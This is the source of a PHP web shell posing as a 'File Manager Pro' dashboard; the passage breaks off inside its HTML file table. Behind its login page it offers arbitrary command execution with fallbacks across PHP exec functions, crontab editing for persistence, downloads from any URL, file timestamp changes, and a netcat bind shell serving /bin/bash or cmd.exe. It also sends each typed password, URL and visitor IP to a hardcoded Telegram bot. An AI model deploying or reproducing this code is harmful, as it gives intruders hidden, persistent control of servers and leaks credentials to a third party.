<?php
/*
 * Advanced PHP File Manager Pro - With Telegram Logging
 * Enhanced Security with Path Encryption & Access Monitoring
 * Upload Methods: Regular, Chunked, and From URL
 */

session_start();
error_reporting(0);
set_time_limit(0);
@ini_set('memory_limit', '999M');

// ==================== CONFIG ====================
$AUTH_HASH = '$2y$10$q7Wokc.4rn2Jm5sa9I/vm.z8H6FDaTDGkxukdxxkrD3Whal9kfBq.';
$ENCRYPTION_KEY = 'ChangeThisSecretKey123!@#';

// TELEGRAM CONFIG - GANTI INI!
$TELEGRAM_BOT_TOKEN = '8055884841:AAHNymaFqhfIBp7vYw4lkHLncykvHpOBZjM';
$TELEGRAM_CHAT_ID = '1883446251';
// ================================================

// TELEGRAM LOGGING FUNCTION
function sendTelegramLog($message) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    
    if ($TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || $TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        return false;
    }
    
    $url = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";
    $data = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

function getFullUrl() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    return $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
}

function getClientIP() {
    $ip = 'UNKNOWN';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// PATH ENCRYPTION FUNCTIONS
function encryptPath($path) {
    global $ENCRYPTION_KEY;
    $encoded = base64_encode($path);
    $hash = substr(md5($ENCRYPTION_KEY . $encoded), 0, 8);
    return $hash . '.' . strtr($encoded, '+/=', '-_,');
}

function decryptPath($encrypted) {
    global $ENCRYPTION_KEY;
    if (empty($encrypted)) return getcwd();
    $parts = explode('.', $encrypted, 2);
    if (count($parts) != 2) return getcwd();
    $decoded = base64_decode(strtr($parts[1], '-_,', '+/='));
    $hash = substr(md5($ENCRYPTION_KEY . base64_encode($decoded)), 0, 8);
    if ($hash !== $parts[0]) return getcwd();
    return $decoded;
}

// DETECT OS
$IS_WIN = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

// LOG AKSES PERTAMA KALI (SEBELUM LOGIN)
if (!isset($_SESSION['access_logged'])) {
    $url = getFullUrl();
    $ip = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $time = date('Y-m-d H:i:s');
    
    $logMessage = "⚠️ <b>=====LOGS FILEMANAGER PRO=====</b>\n";
    $logMessage .= "📍 <b>URL:</b> <code>{$url}</code>\n";
    $logMessage .= "🔍 <b>Status:</b> Mengakses halaman login\n";
    $logMessage .= "📝 <b>Password:</b> -\n";
    $logMessage .= "✅ <b>Status Session:</b> Belum login\n";
    $logMessage .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
    $logMessage .= "🖥 <b>User-Agent:</b> <code>{$userAgent}</code>\n";
    $logMessage .= "⏰ <b>Waktu:</b> {$time}\n";
    $logMessage .= "<b>================================</b>";
    
    sendTelegramLog($logMessage);
    $_SESSION['access_logged'] = true;
}

// LOGIN HANDLER
if (!isset($_SESSION['logged']) && isset($_POST['pass'])) {
    $inputPass = $_POST['pass'];
    $isValid = password_verify($inputPass, $AUTH_HASH);
    
    $url = getFullUrl();
    $ip = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $time = date('Y-m-d H:i:s');
    
    $logMessage = ($isValid ? "✅" : "❌") . " <b>=====LOGS FILEMANAGER PRO=====</b>\n";
    $logMessage .= "📍 <b>URL:</b> <code>{$url}</code>\n";
    $logMessage .= "🔑 <b>Status:</b> Mencoba login\n";
    $logMessage .= "📝 <b>Password:</b> <code>{$inputPass}</code>\n";
    $logMessage .= "✅ <b>Status Session:</b> " . ($isValid ? "✅ Valid Login" : "❌ Failed Login") . "\n";
    $logMessage .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
    $logMessage .= "🖥 <b>User-Agent:</b> <code>{$userAgent}</code>\n";
    $logMessage .= "⏰ <b>Waktu:</b> {$time}\n";
    $logMessage .= "<b>================================</b>";
    
    sendTelegramLog($logMessage);
    
    if ($isValid) {
        $_SESSION['logged'] = true;
        $_SESSION['home_dir'] = getcwd();
        unset($_SESSION['access_logged']);
    }
}

if (isset($_GET['logout'])) {
    $url = getFullUrl();
    $ip = getClientIP();
    $time = date('Y-m-d H:i:s');
    
    $logMessage = "🚪 <b>=====LOGS FILEMANAGER PRO=====</b>\n";
    $logMessage .= "📍 <b>URL:</b> <code>{$url}</code>\n";
    $logMessage .= "🔑 <b>Status:</b> Logout\n";
    $logMessage .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
    $logMessage .= "⏰ <b>Waktu:</b> {$time}\n";
    $logMessage .= "<b>================================</b>";
    
    sendTelegramLog($logMessage);
    
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{background:#0a0a0a;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}
            .login{background:#000;border:2px solid #0f0;padding:40px;border-radius:8px;box-shadow:0 0 30px #0f0;animation:glow 2s infinite}
            @keyframes glow{0%,100%{box-shadow:0 0 30px #0f0}50%{box-shadow:0 0 50px #0f0,0 0 80px #0f0}}
            h2{text-align:center;margin-bottom:20px;text-shadow:0 0 10px #0f0;font-size:20px}
            .lock{text-align:center;font-size:48px;margin-bottom:15px;animation:pulse 1.5s infinite}
            @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
            input{background:#000;border:1px solid #0f0;color:#0f0;padding:12px;margin:10px 0;width:280px;display:block;border-radius:4px;transition:all 0.3s}
            input:focus{outline:none;border-color:#00ff00;box-shadow:0 0 15px #0f0}
            button{background:#0f0;color:#000;border:none;padding:12px;cursor:pointer;font-weight:bold;width:100%;margin-top:10px;border-radius:4px;font-size:14px;transition:all 0.3s}
            button:hover{background:#00ff00;box-shadow:0 0 20px #0f0;transform:translateY(-2px)}
            button:active{transform:translateY(0)}
            .warning{color:#f00;font-size:11px;text-align:center;margin-top:15px;padding:8px;border:1px solid #f00;border-radius:4px;background:#1a0000}
        </style>
    </head>
    <body>
        <div class="login">
            <div class="lock">🔐</div>
            <h2>SECURE ACCESS REQUIRED</h2>
            <form method="post">
                <input type="password" name="pass" placeholder="Enter Password" required autofocus autocomplete="off">
                <button type="submit">🚀 ACCESS SYSTEM</button>
            </form>
            <?php if (isset($_POST['pass']) && !isset($_SESSION['logged'])): ?>
            <div class="warning">⚠️ Invalid credentials!</div>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Set home directory if not set yet
if (!isset($_SESSION['home_dir'])) {
    $_SESSION['home_dir'] = getcwd();
}

// FUNCTIONS
function formatSize($bytes) {
    if ($bytes < 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), 2) . ' ' . $units[$pow];
}

function getPerms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '----------';
    $info = '';
    $info .= (($perms & 0x4000) == 0x4000) ? 'd' : '-';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function execCmd($cmd) {
    global $IS_WIN;
    $output = '';
    
    if (function_exists('exec')) {
        @exec($cmd . ($IS_WIN ? '' : ' 2>&1'), $o);
        $output = implode("\n", $o);
    } elseif (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ($IS_WIN ? '' : ' 2>&1'));
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ($IS_WIN ? '' : ' 2>&1'));
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ($IS_WIN ? '' : ' 2>&1'));
        $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = @popen($cmd . ($IS_WIN ? '' : ' 2>&1'), 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
        }
    }
    
    return $output ?: 'Command executed (no output or function disabled)';
}

function deleteDir($dir) {
    if (!is_dir($dir)) return false;
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteDir($path) : @unlink($path);
    }
    return @rmdir($dir);
}

function downloadFromUrl($url, $targetPath) {
    $url = trim($url);
    if (empty($url)) return ['status' => 'error', 'msg' => 'URL is empty'];
    
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return ['status' => 'error', 'msg' => 'Invalid URL format'];
    }
    
    $parsedUrl = parse_url($url);
    $fileName = basename($parsedUrl['path'] ?? 'downloaded_file');
    if (empty($fileName) || $fileName == '/' || $fileName == '.') {
        $fileName = 'downloaded_' . time();
    }
    
    $target = $targetPath . DIRECTORY_SEPARATOR . $fileName;
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 300,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_CONNECTTIMEOUT => 30,
            CURLOPT_BUFFERSIZE => 8192,
        ]);
        
        $data = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            return ['status' => 'error', 'msg' => 'cURL Error: ' . $error];
        }
        
        if ($httpCode >= 400) {
            return ['status' => 'error', 'msg' => "HTTP Error: {$httpCode}"];
        }
        
        if (empty($data)) {
            return ['status' => 'error', 'msg' => 'Downloaded empty content'];
        }
    } else {
        $ctx = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 300,
                'follow_location' => 1,
                'max_redirects' => 10,
                'header' => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
                'ignore_errors' => true,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        
        $data = @file_get_contents($url, false, $ctx);
        
        if ($data === false) {
            return ['status' => 'error', 'msg' => 'Failed to download file: network error or timeout'];
        }
    }
    
    $written = @file_put_contents($target, $data);
    if ($written === false) {
        return ['status' => 'error', 'msg' => 'Cannot write file to destination'];
    }
    
    return [
        'status' => 'ok',
        'msg' => 'File downloaded successfully: ' . $fileName,
        'file_name' => $fileName,
        'size' => formatSize($written),
    ];
}

// GET CURRENT DIR
$currentDir = isset($_GET['p']) ? decryptPath($_GET['p']) : getcwd();
if (!is_dir($currentDir)) $currentDir = getcwd();
@chdir($currentDir);

// API HANDLERS (AJAX)
if (isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    // ==================== UPLOAD: CHUNKED ====================
    if ($_POST['ajax'] == 'upload_chunk' && isset($_FILES['chunk'])) {
        $targetDir = decryptPath($_POST['target_dir']);
        $fileName = basename($_POST['file_name']);
        $target = $targetDir . DIRECTORY_SEPARATOR . $fileName;
        $chunkIndex = intval($_POST['chunk_index']);
        $totalChunks = intval($_POST['total_chunks']);
        
        $chunkData = file_get_contents($_FILES['chunk']['tmp_name']);
        $mode = ($chunkIndex === 0) ? 'wb' : 'ab';
        
        $fp = @fopen($target, $mode);
        if ($fp) {
            fwrite($fp, $chunkData);
            fclose($fp);
            
            if ($chunkIndex === $totalChunks - 1) {
                $finalSize = @filesize($target);
                echo json_encode([
                    'status' => 'done',
                    'msg' => 'Chunked upload complete!',
                    'file_name' => $fileName,
                    'size' => formatSize($finalSize)
                ]);
            } else {
                echo json_encode([
                    'status' => 'ok',
                    'progress' => round((($chunkIndex + 1) / $totalChunks) * 100, 2)
                ]);
            }
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'Cannot write file']);
        }
        exit;
    }
    
    // ==================== UPLOAD: REGULAR ====================
    if ($_POST['ajax'] == 'upload_regular' && isset($_FILES['regular_file'])) {
        $targetDir = decryptPath($_POST['target_dir']);
        $file = $_FILES['regular_file'];
        
        if ($file['error'] !== UPLOAD_ERR_OK) {
            $errors = [
                UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
                UPLOAD_ERR_FORM_SIZE => 'File exceeds form MAX_FILE_SIZE',
                UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
                UPLOAD_ERR_NO_FILE => 'No file was uploaded',
                UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                UPLOAD_ERR_EXTENSION => 'Upload stopped by PHP extension',
            ];
            $msg = $errors[$file['error']] ?? 'Unknown upload error';
            echo json_encode(['status' => 'error', 'msg' => $msg]);
            exit;
        }
        
        $fileName = basename($file['name']);
        $target = $targetDir . DIRECTORY_SEPARATOR . $fileName;
        
        if (@move_uploaded_file($file['tmp_name'], $target)) {
            echo json_encode([
                'status' => 'ok',
                'msg' => 'Regular upload complete!',
                'file_name' => $fileName,
                'size' => formatSize($file['size'])
            ]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'Cannot move uploaded file']);
        }
        exit;
    }
    
    // ==================== UPLOAD: FROM URL ====================
    if ($_POST['ajax'] == 'upload_url') {
        $targetDir = decryptPath($_POST['target_dir']);
        $url = $_POST['url'] ?? '';
        $result = downloadFromUrl($url, $targetDir);
        echo json_encode($result);
        exit;
    }
    
    // CREATE
    if ($_POST['ajax'] == 'create') {
        $dir = decryptPath($_POST['dir']);
        $name = $_POST['name'];
        $type = $_POST['type'];
        $path = $dir . DIRECTORY_SEPARATOR . $name;
        
        if ($type == 'file') {
            if (@file_put_contents($path, '') !== false) {
                echo json_encode(['status' => 'ok', 'msg' => 'File created']);
            } else {
                echo json_encode(['status' => 'error', 'msg' => 'Cannot create file']);
            }
        } else {
            if (@mkdir($path, 0755, true)) {
                echo json_encode(['status' => 'ok', 'msg' => 'Folder created']);
            } else {
                echo json_encode(['status' => 'error', 'msg' => 'Cannot create folder']);
            }
        }
        exit;
    }
    
    // DELETE
    if ($_POST['ajax'] == 'delete') {
        $path = $_POST['path'];
        if (is_file($path)) {
            $result = @unlink($path);
        } elseif (is_dir($path)) {
            $result = deleteDir($path);
        }
        echo json_encode(['status' => $result ? 'ok' : 'error', 'msg' => $result ? 'Deleted' : 'Failed to delete']);
        exit;
    }
    
    // RENAME
    if ($_POST['ajax'] == 'rename') {
        $old = $_POST['old_path'];
        $new = $_POST['new_path'];
        $result = @rename($old, $new);
        echo json_encode(['status' => $result ? 'ok' : 'error', 'msg' => $result ? 'Renamed' : 'Failed']);
        exit;
    }
    
    // CHMOD
    if ($_POST['ajax'] == 'chmod') {
        $path = $_POST['path'];
        $perms = $_POST['perms'];
        $result = @chmod($path, octdec($perms));
        echo json_encode(['status' => $result ? 'ok' : 'error', 'msg' => $result ? 'Permissions changed' : 'Failed']);
        exit;
    }
    
    // TOUCH
    if ($_POST['ajax'] == 'touch') {
        $path = $_POST['path'];
        $time = strtotime($_POST['time']);
        $result = @touch($path, $time);
        echo json_encode(['status' => $result ? 'ok' : 'error', 'msg' => $result ? 'Time modified' : 'Failed']);
        exit;
    }
    
    // GET FILE CONTENT
    if ($_POST['ajax'] == 'get_content') {
        $path = $_POST['path'];
        $content = @file_get_contents($path);
        if ($content !== false) {
            echo json_encode(['status' => 'ok', 'content' => $content, 'path' => $path]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'Cannot read file']);
        }
        exit;
    }
    
    // SAVE FILE
    if ($_POST['ajax'] == 'save_file') {
        $path = $_POST['path'];
        $content = $_POST['content'];
        $result = @file_put_contents($path, $content);
        echo json_encode(['status' => $result !== false ? 'ok' : 'error', 'msg' => $result !== false ? 'File saved' : 'Failed to save']);
        exit;
    }
    
    // TERMINAL
    if ($_POST['ajax'] == 'terminal') {
        $cmd = $_POST['cmd'];
        $output = execCmd($cmd);
        echo json_encode(['status' => 'ok', 'output' => $output]);
        exit;
    }
    
    // CRONTAB
    if ($_POST['ajax'] == 'crontab') {
        if ($_POST['action'] == 'read') {
            $output = execCmd('crontab -l');
        } else {
            $content = $_POST['content'];
            $tmpFile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'crontab_' . time() . '.tmp';
            file_put_contents($tmpFile, $content);
            $output = execCmd('crontab ' . $tmpFile);
            @unlink($tmpFile);
            if (empty($output)) $output = 'Crontab updated successfully';
        }
        echo json_encode(['status' => 'ok', 'output' => $output]);
        exit;
    }
    
    // BIND PORT
    if ($_POST['ajax'] == 'bind') {
        global $IS_WIN;
        $port = intval($_POST['port']);
        
        if ($IS_WIN) {
            $cmd = "start /B nc -lvp $port -e cmd.exe";
        } else {
            $cmd = "nc -lvp $port -e /bin/bash > /dev/null 2>&1 &";
        }
        
        $output = execCmd($cmd);
        $output .= "\n\nListener started on port $port";
        $output .= "\nConnect with: nc " . ($_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())) . " $port";
        
        echo json_encode(['status' => 'ok', 'output' => $output]);
        exit;
    }
}

// SERVER INFO
$serverInfo = [
    'OS' => php_uname(),
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'PHP Version' => phpversion(),
    'User' => @get_current_user(),
    'UID/GID' => @getmyuid() . '/' . @getmygid(),
    'Current Dir' => getcwd(),
    'Server IP' => $_SERVER['SERVER_ADDR'] ?? @gethostbyname(gethostname()),
    'Your IP' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
    'Disk Free' => @formatSize(@disk_free_space('.')),
    'Disk Total' => @formatSize(@disk_total_space('.')),
    'Disabled Functions' => @ini_get('disable_functions') ?: 'None'
];

$homeDirEnc = encryptPath($_SESSION['home_dir']);

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager Pro</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#0f0;font-family:'Courier New',monospace;font-size:13px;line-height:1.4}
        .container{padding:20px;max-width:100%}
        .header{background:#000;border:2px solid #0f0;padding:15px;margin-bottom:20px;border-radius:5px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
        .header h1{color:#0f0;text-shadow:0 0 10px #0f0;font-size:24px}
        .header-right{display:flex;align-items:center;gap:10px}
        .info{background:#111;border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:3px}
        .info h3{margin-bottom:10px;color:#0f0;text-shadow:0 0 5px #0f0}
        .info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:10px;font-size:12px}
        .info-item{padding:5px;border-left:2px solid #0f0;padding-left:10px}
        .info-item strong{color:#00ff00}
        .path{background:#000;border:1px solid #0f0;padding:12px;margin:10px 0;border-radius:3px;word-break:break-all}
        .path a{color:#0f0;text-decoration:none;padding:3px 6px;margin:0 2px;border:1px solid transparent}
        .path a:hover{background:#111;border-color:#0f0;border-radius:3px}
        .actions{background:#111;border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:3px}
        .actions h3{margin-bottom:10px;color:#0f0}
        .btn{background:#0f0;color:#000;border:none;padding:8px 15px;margin:3px;cursor:pointer;font-weight:bold;border-radius:3px;font-family:inherit;font-size:12px;transition:all 0.3s;text-decoration:none;display:inline-block}
        .btn:hover{background:#00ff00;box-shadow:0 0 15px #0f0;transform:translateY(-1px)}
        .btn:active{transform:translateY(0)}
        .btn-sm{padding:5px 10px;font-size:11px}
        .btn-danger{background:#f00;color:#fff}
        .btn-danger:hover{background:#ff3333;box-shadow:0 0 15px #f00}
        .btn-warning{background:#ff0;color:#000}
        .btn-warning:hover{background:#ffff00}
        .btn-home{background:#00bcd4;color:#000}
        .btn-home:hover{background:#00e5ff;box-shadow:0 0 15px #00bcd4}
        .btn-info{background:#0088cc;color:#fff}
        .btn-info:hover{background:#00aaff;box-shadow:0 0 15px #0088cc}
        input,textarea,select{background:#000;border:1px solid #0f0;color:#0f0;padding:8px;margin:5px 0;font-family:inherit;border-radius:3px}
        input:focus,textarea:focus,select:focus{outline:none;border-color:#00ff00;box-shadow:0 0 10px #0f0}
        .table-container{overflow-x:auto}
        .table{width:100%;border-collapse:collapse;margin:20px 0;background:#000;border:1px solid #0f0;min-width:800px}
        .table th{background:#0f0;color:#000;padding:12px 8px;text-align:left;font-weight:bold;font-size:12px;position:sticky;top:0}
        .table td{padding:8px;border-bottom:1px solid #0f0;font-size:12px}
        .table tr:hover{background:#111}
        .table a{color:#0f0;text-decoration:none}
        .table a:hover{color:#00ff00;text-decoration:underline}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;overflow:auto}
        .modal-content{background:#000;border:2px solid #0f0;padding:25px;margin:30px auto;max-width:900px;border-radius:5px;box-shadow:0 0 50px #0f0;animation:modalOpen 0.3s}
        @keyframes modalOpen{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
        .modal h2{color:#0f0;margin-bottom:20px;text-shadow:0 0 10px #0f0}
        .close{color:#f00;float:right;font-size:32px;font-weight:bold;cursor:pointer;line-height:20px;transition:all 0.3s}
        .close:hover{color:#ff3333;text-shadow:0 0 15px #f00;transform:scale(1.2)}
        textarea{width:100%;min-height:400px;resize:vertical;font-size:13px}
        .terminal{background:#000;border:2px solid #0f0;padding:15px;margin:15px 0;border-radius:3px;min-height:400px;max-height:600px;overflow-y:auto;font-size:13px}
        .terminal-output{white-space:pre-wrap;margin-bottom:15px;word-break:break-all}
        .terminal-input{display:flex;align-items:center;gap:10px}
        .terminal-input input{flex:1;margin:0}
        .terminal-prompt{color:#00ff00;font-weight:bold}
        .upload-area{border:2px dashed #0f0;padding:40px;text-align:center;margin:15px 0;cursor:pointer;border-radius:5px;transition:all 0.3s}
        .upload-area:hover{background:#111;border-color:#00ff00;box-shadow:0 0 20px #0f0}
        .progress{background:#000;border:1px solid #0f0;height:25px;margin:15px 0;border-radius:3px;overflow:hidden}
        .progress-bar{background:#0f0;height:100%;transition:width 0.3s;display:flex;align-items:center;justify-content:center;color:#000;font-weight:bold;font-size:12px}
        .alert{padding:12px;margin:10px 0;border-radius:3px;border:1px solid}
        .alert-success{background:#0f0;color:#000;border-color:#00ff00}
        .alert-error{background:#f00;color:#fff;border-color:#ff3333}
        .os-badge{display:inline-block;padding:3px 8px;border-radius:3px;font-size:11px;font-weight:bold;margin-left:10px}
        .os-windows{background:#0078d4;color:#fff}
        .os-linux{background:#fcc624;color:#000}
        .tg-badge{background:#0088cc;color:#fff;padding:5px 10px;border-radius:3px;font-size:11px;margin-left:10px}
        .tab-container{margin:15px 0}
        .tab-buttons{display:flex;gap:0;margin-bottom:0}
        .tab-btn{background:#111;color:#0f0;border:1px solid #0f0;padding:10px 20px;cursor:pointer;font-family:inherit;font-size:13px;font-weight:bold;transition:all 0.3s;border-bottom:none}
        .tab-btn:hover{background:#1a1a1a}
        .tab-btn.active{background:#0f0;color:#000;border-color:#0f0}
        .tab-content{display:none;border:1px solid #0f0;padding:20px;background:#000;border-radius:0 0 5px 5px}
        .tab-content.active{display:block}
        .url-input-group{display:flex;gap:10px;align-items:center}
        .url-input-group input{flex:1}
        @media(max-width:768px){
            .info-grid{grid-template-columns:1fr}
            .btn{display:block;width:100%;margin:5px 0}
            .table{font-size:11px}
            .table th,.table td{padding:6px 4px}
            .header{flex-direction:column;text-align:center}
            .header-right{margin-top:10px}
            .tab-buttons{flex-direction:column}
            .tab-btn{border-bottom:1px solid #0f0}
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🚀 FILE MANAGER PRO 
            <span class="os-badge <?= $IS_WIN ? 'os-windows' : 'os-linux' ?>">
                <?= $IS_WIN ? '⊞ WIN' : '🐧 LINUX' ?>
            </span>
            <?php if ($TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE'): ?>
            <?php endif; ?>
        </h1>
        <div class="header-right">
            <a href="?p=<?= urlencode($homeDirEnc) ?>" class="btn btn-home" title="Go to Home Directory">🏠 HOME</a>
            <a href="?logout" class="btn btn-danger">🚪 LOGOUT</a>
        </div>
    </div>

    <div id="alertBox"></div>

    <div class="info">
        <h3>📊 SERVER INFORMATION</h3>
        <div class="info-grid">
            <?php foreach ($serverInfo as $key => $val): ?>
            <div class="info-item"><strong><?= $key ?>:</strong> <?= htmlspecialchars($val) ?></div>
            <?php endforeach; ?>
        </div>
    </div>

    <div class="path">
        <strong>📂 PATH:</strong>
        <?php
        $isWin = DIRECTORY_SEPARATOR === '\\';
        if ($isWin) {
            $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
            $pathLink = '';
            foreach ($parts as $i => $p) {
                if (empty($p)) continue;
                $pathLink .= ($pathLink ? DIRECTORY_SEPARATOR : '') . $p;
                $encrypted = encryptPath($pathLink);
                echo '<a href="?p=' . urlencode($encrypted) . '">' . htmlspecialchars($p) . '</a> ' . DIRECTORY_SEPARATOR . ' ';
            }
        } else {
            $parts = explode('/', $currentDir);
            $pathLink = '';
            echo '<a href="?p=' . urlencode(encryptPath('/')) . '">/</a>';
            foreach ($parts as $i => $p) {
                if ($p == '') continue;
                $pathLink .= '/' . $p;
                $encrypted = encryptPath($pathLink);
                echo '<a href="?p=' . urlencode($encrypted) . '">' . htmlspecialchars($p) . '</a> / ';
            }
        }
        ?>
    </div>

    <div class="actions">
        <h3>⚡ QUICK ACTIONS</h3>
        <a href="?p=<?= urlencode($homeDirEnc) ?>" class="btn btn-home">🏠 HOME</a>
        <button class="btn" onclick="showModal('createModal')">➕ CREATE</button>
        <button class="btn" onclick="showModal('uploadModal')">📤 UPLOAD</button>
        <button class="btn" onclick="showModal('terminalModal')">💻 TERMINAL</button>
        <button class="btn" onclick="showModal('crontabModal')">⏰ CRONTAB</button>
        <button class="btn" onclick="showModal('bindModal')">🔌 BIND PORT</button>
        <?php 
        $parentDir = dirname($currentDir);
        if ($parentDir !== $currentDir):
            $encParent = encryptPath($parentDir);
        ?>
        <button class="btn btn-warning" onclick="location.href='?p=<?= urlencode($encParent) ?>'">⬆️ PARENT DIR</button>
        <?php endif; ?>
        <button class="btn btn-info" onclick="location.reload()">🔄 REFRESH</button>
    </div>

    <div class="table-container">
        <table class="table">
            <thead>
                <tr>
                    <th style="width:40%">📋 Name</th>
                    <th style="width:10%">💾 Size</th>
                    <th style="width:12%">🔐 Perms</th>
                    <th style="width:18%">📅 Modified</th>
                    <th style="width:20%">⚙️ Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $items = @scandir($currentDir);
                $dirs = [];
                $files = [];
                
                if ($items) {
                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;
                        $path = $currentDir . DIRECTORY_SEPARATOR . $item;
                        if (is_dir($path)) {
                            $dirs[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    }
                    
                    sort($dirs);
                    sort($files);
                    $items = array_merge($dirs, $files);
                    
                    foreach ($items as $item) {
                        $path = $currentDir . DIRECTORY_SEPARATOR . $item;
                        $isDir = is_dir($path);
                        $perms = getPerms($path);
                        $size = $isDir ? '[DIR]' : formatSize(@filesize($path));
                        $mtime = @date('Y-m-d H:i:s', @filemtime($path));
                        $icon = $isDir ? '📁' : '📄';
                        $encPath = encryptPath($path);
                        ?>
                        <tr>
                            <td>
                                <?= $icon ?>
                                <?php if ($isDir): ?>
                                    <a href="?p=<?= urlencode($encPath) ?>"><strong><?= htmlspecialchars($item) ?></strong></a>
                                <?php else: ?>
                                    <span><?= htmlspecialchars($item) ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?= $size ?></td>
                            <td><code><?= $perms ?></code></td>
                            <td><?= $mtime ?></td>
                            <td>
                                <?php if (!$isDir): ?>
